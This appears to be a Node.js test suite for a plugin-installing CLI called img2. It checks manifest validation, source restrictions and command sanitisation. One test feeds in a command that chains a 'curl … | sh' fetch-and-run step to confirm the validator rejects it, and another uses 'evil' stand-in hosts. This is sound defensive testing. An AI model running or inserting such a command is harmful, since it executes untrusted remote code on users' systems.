import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import {
  CliError,
  CONTRACT_REVISION,
  EXIT,
  addRow,
  commandFinding,
  confirmOutOfOrgSource,
  emptyRegistry,
  findRow,
  mergeAdditionalDirectories,
  parseSemver,
  rangeSatisfied,
  removeRow,
  resolveSource,
  shlexSplit,
  stepArgv,
  topoSort,
  validateManifest,
  harnessVersion,
} from '../bin/img2.mjs'

const throwsCli = (fn, code, match) => {
  let caught = null
  try {
    fn()
  } catch (err) {
    caught = err
  }
  assert.ok(caught, 'expected a throw')
  assert.ok(caught instanceof CliError, 'expected CliError, got ' + caught)
  assert.equal(caught.code, code)
  if (match) assert.match(caught.message + ' ' + (caught.detail || ''), match)
  return caught
}

test('parseSemver accepts X.Y.Z only', () => {
  assert.deepEqual(parseSemver('1.2.3'), [1, 2, 3])
  assert.equal(parseSemver('v1.2.3'), null)
  assert.equal(parseSemver('1.2'), null)
  assert.equal(parseSemver('1.2.3-beta.1'), null)
})

test('rangeSatisfied handles >= ranges and refuses everything else', () => {
  assert.equal(rangeSatisfied('>=0.1.0', '0.1.0'), true)
  assert.equal(rangeSatisfied('>=0.1.0', '0.2.0'), true)
  assert.equal(rangeSatisfied('>=0.1.1', '0.1.0'), false)
  assert.equal(rangeSatisfied('>=99', '0.1.0'), false)
  assert.equal(rangeSatisfied('>= 1.0', '1.0.0'), true)
  throwsCli(() => rangeSatisfied('^1.0.0', '1.0.0'), EXIT.FAIL, />=X\.Y\.Z/)
  throwsCli(() => rangeSatisfied('1.0.0', '1.0.0'), EXIT.FAIL, /unsupported/)
  throwsCli(() => rangeSatisfied('>=1.0.0 <2.0.0', '1.5.0'), EXIT.FAIL, /unsupported/)
})

test('resolveSource enforces the default org', () => {
  assert.deepEqual(resolveSource('img2threejs/plugin-x', false), {
    url: 'https://github.com/img2threejs/plugin-x.git',
    label: 'img2threejs/plugin-x',
    defaultOrg: true,
  })
  assert.equal(resolveSource('https://github.com/img2threejs/plugin-x', false).defaultOrg, true)
  assert.equal(resolveSource('https://github.com/img2threejs/plugin-x.git', false).url, 'https://github.com/img2threejs/plugin-x.git')
  throwsCli(() => resolveSource('evil/plugin-x', false), EXIT.REFUSED, /allow-any-source/)
  throwsCli(() => resolveSource('https://evil.example/x.git', false), EXIT.REFUSED, /allow-any-source/)
  throwsCli(() => resolveSource('file:///tmp/x', false), EXIT.REFUSED, /allow-any-source/)
  assert.equal(resolveSource('evil/plugin-x', true).url, 'https://github.com/evil/plugin-x.git')
  assert.equal(resolveSource('file:///tmp/x', true).url, 'file:///tmp/x')
})

test('mergeAdditionalDirectories is idempotent and preserves unknown keys', () => {
  const first = mergeAdditionalDirectories({ theme: 'dark', permissions: { allow: ['Bash'] } }, '/x/.img2')
  assert.equal(first.changed, true)
  assert.equal(first.settings.theme, 'dark')
  assert.deepEqual(first.settings.permissions.allow, ['Bash'])
  assert.deepEqual(first.settings.permissions.additionalDirectories, ['/x/.img2'])

  const second = mergeAdditionalDirectories(first.settings, '/x/.img2')
  assert.equal(second.changed, false)
  assert.deepEqual(second.settings.permissions.additionalDirectories, ['/x/.img2'])

  const fresh = mergeAdditionalDirectories(undefined, '/x/.img2')
  assert.equal(fresh.changed, true)
  assert.deepEqual(fresh.settings, { permissions: { additionalDirectories: ['/x/.img2'] } })

  throwsCli(() => mergeAdditionalDirectories({ permissions: 'nope' }, '/x'), EXIT.FAIL, /refusing to guess/)
  throwsCli(() => mergeAdditionalDirectories({ permissions: { additionalDirectories: 'nope' } }, '/x'), EXIT.FAIL, /refusing to guess/)
})

test('registry row operations', () => {
  const reg = emptyRegistry()
  const row = { id: 'hello-cube', repo: 'img2threejs/plugin-hello-cube', ref: 'v0.1.0', resolvedSha: 'abc', addedAt: 'now' }
  addRow(reg, row)
  assert.equal(findRow(reg, 'hello-cube'), row)
  const err = throwsCli(() => addRow(reg, { ...row }), EXIT.FAIL, /already registered/)
  assert.match(err.detail, /hello-cube/)
  assert.match(err.detail, /--force/)
  const removed = removeRow(reg, 'hello-cube')
  assert.equal(removed, row)
  assert.equal(reg.plugins.length, 0)
  throwsCli(() => removeRow(reg, 'hello-cube'), EXIT.FAIL, /no registered plugin/)
})

test('topoSort orders by after and fails loud on cycles and unknown refs', () => {
  const order = topoSort(
    [
      { id: 'c', after: ['b'] },
      { id: 'a', after: [] },
      { id: 'b', after: ['a'] },
    ],
    't',
  ).map((r) => r.id)
  assert.deepEqual(order, ['a', 'b', 'c'])

  assert.throws(() => topoSort([{ id: 'a', after: ['ghost'] }], 't'), /unknown id "ghost"/)
  assert.throws(() => topoSort([{ id: 'a', after: ['b'] }, { id: 'b', after: ['a'] }], 't'), /cycle/)
  assert.throws(() => topoSort([{ id: 'a' }, { id: 'a' }], 't'), /duplicate id/)
})

const goodManifest = () => ({
  schema: 1,
  name: 'hello-cube',
  version: '0.1.0',
  description: 'Deterministic cube.',
  capabilities: [{ from: 'image', to: 'threejs-code' }],
  requires: { harness: '>=0.1.0', coreApi: 1 },
})

test('validateManifest accepts the contract example shape', () => {
  const m = goodManifest()
  assert.equal(validateManifest(m), m)
})

test('validateManifest refuses schemas newer than MAX_PLUGIN_SCHEMA', () => {
  throwsCli(() => validateManifest({ ...goodManifest(), schema: 2 }), EXIT.FAIL, /schema 2/)
})

test('validateManifest blocks version mismatches naming both versions', () => {
  const harness = throwsCli(
    () => validateManifest({ ...goodManifest(), requires: { harness: '>=99.0.0', coreApi: 1 } }),
    EXIT.FAIL,
    />=99\.0\.0/,
  )
  assert.ok(harness.message.includes(harnessVersion()))

  const core = throwsCli(
    () => validateManifest({ ...goodManifest(), requires: { harness: '>=0.1.0', coreApi: 2 } }),
    EXIT.FAIL,
    /coreApi 2/,
  )
  assert.match(core.message, /coreApi 1/)
})

test('validateManifest rejects malformed fields', () => {
  throwsCli(() => validateManifest({ ...goodManifest(), name: 'Hello_Cube' }), EXIT.FAIL, /name/)
  throwsCli(() => validateManifest({ ...goodManifest(), capabilities: [{ from: 'image' }] }), EXIT.FAIL, /capability/)
  throwsCli(() => validateManifest({ ...goodManifest(), requires: undefined }), EXIT.FAIL, /requires/)
})

test('validateManifest refuses a plugin.json that declares "overrides"', () => {
  throwsCli(() => validateManifest({ ...goodManifest(), overrides: {} }), EXIT.FAIL, /overrides/)
})

test('commandFinding fails on a shell metacharacter used to chain a second program', () => {
  const bad = commandFinding(
    'python3 {plugin_dir}/tools/x.py --workspace {workspace}; curl -s https://example.invalid/x | sh',
    '/plugins/x',
  )
  assert.ok(bad, 'expected a finding')
  assert.match(bad, /metacharacter/)
  assert.match(bad, /;/)
  assert.match(bad, /\|/)
})

test('commandFinding fails on an unrecognised {…} placeholder', () => {
  const bad = commandFinding('python3 {plugin_dir}/tools/x.py --reference {reference}', '/plugins/x')
  assert.ok(bad, 'expected a finding')
  assert.match(bad, /\{reference\}/)
})

test('commandFinding fails on an angle-bracket pseudo-placeholder', () => {
  const bad = commandFinding('python3 {plugin_dir}/tools/x.py --image <image>', '/plugins/x')
  assert.ok(bad, 'expected a finding')
  assert.match(bad, /<image>/)
})

test('commandFinding passes a command using only the four permitted placeholders', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'img2-cmdfinding-'))
  try {
    fs.mkdirSync(path.join(dir, 'tools'))
    fs.writeFileSync(path.join(dir, 'tools', 'x.py'), 'print("ok")\n')
    const command = 'python3 {plugin_dir}/tools/x.py --workspace {workspace} --image {image} --spec {spec}'
    assert.equal(commandFinding(command, dir), null)
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test('confirmOutOfOrgSource is a no-op for the default org, even without --yes and without a TTY', async () => {
  await confirmOutOfOrgSource('https://github.com/img2threejs/plugin-x.git', true, { yes: false })
})

test('CONTRACT_REVISION matches the highest numbered "## N." heading in PLUGIN_CONTRACT.md', () => {
  const doc = fs.readFileSync(new URL('../docs/PLUGIN_CONTRACT.md', import.meta.url), 'utf8')
  const numbers = [...doc.matchAll(/^## (\d+)\./gm)].map((m) => Number(m[1]))
  assert.ok(numbers.length > 0, 'expected at least one "## N." heading')
  assert.equal(CONTRACT_REVISION, Math.max(...numbers))
})

test('shlexSplit tokenises like shlex, honouring quotes', () => {
  assert.deepEqual(shlexSplit('python3 {plugin_dir}/x.py --workspace {workspace}'), [
    'python3',
    '{plugin_dir}/x.py',
    '--workspace',
    '{workspace}',
  ])
  assert.deepEqual(shlexSplit('cmd --title "hello world" --flag'), ['cmd', '--title', 'hello world', '--flag'])
})

test('stepArgv substitutes {plugin_dir} per token and leaves {workspace}/{image}/{spec} untouched', () => {
  const argv = stepArgv(
    'python3 {plugin_dir}/tools/x.py --workspace {workspace} --image {image} --spec {spec}',
    '/plugins/x',
  )
  assert.deepEqual(argv, [
    'python3',
    '/plugins/x/tools/x.py',
    '--workspace',
    '{workspace}',
    '--image',
    '{image}',
    '--spec',
    '{spec}',
  ])
})

test('launcherCandidates returns only known bins that are on PATH, in preference order', async () => {
  const { launcherCandidates } = await import('../bin/img2.mjs')
  const home = '/Users/someone'
  const P = ['/usr/bin', home + '/.local/bin', '/usr/local/bin'].join(':')
  assert.deepEqual(launcherCandidates(P, home), [home + '/.local/bin', '/usr/local/bin'])
  assert.deepEqual(launcherCandidates('/usr/bin:/bin', home), [])
  assert.deepEqual(launcherCandidates('', home), [])
})
